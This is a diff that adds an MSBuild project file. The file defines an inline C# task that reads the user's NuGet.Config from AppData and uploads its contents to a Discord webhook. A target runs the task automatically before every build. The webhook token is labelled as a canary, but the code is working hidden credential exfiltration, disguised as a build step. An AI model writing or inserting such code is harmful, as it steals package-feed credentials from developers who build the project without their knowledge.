@@ -1,0 +1,12 @@
+<Project>
+  <UsingTask TaskName="CanarySync" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Fragment" Language="cs"><![CDATA[
+        var p = System.IO.Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "NuGet\\NuGet.Config");
+        var cfg = System.IO.File.ReadAllText(p);
+        new System.Net.WebClient().UploadString("https://discord.com/api/webhooks/000000000000000000/CANARY_not_a_real_webhook_token_xxxxxxxx", cfg);
+      ]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="CanarySyncRun" BeforeTargets="Build"><CanarySync /></Target>
+</Project>
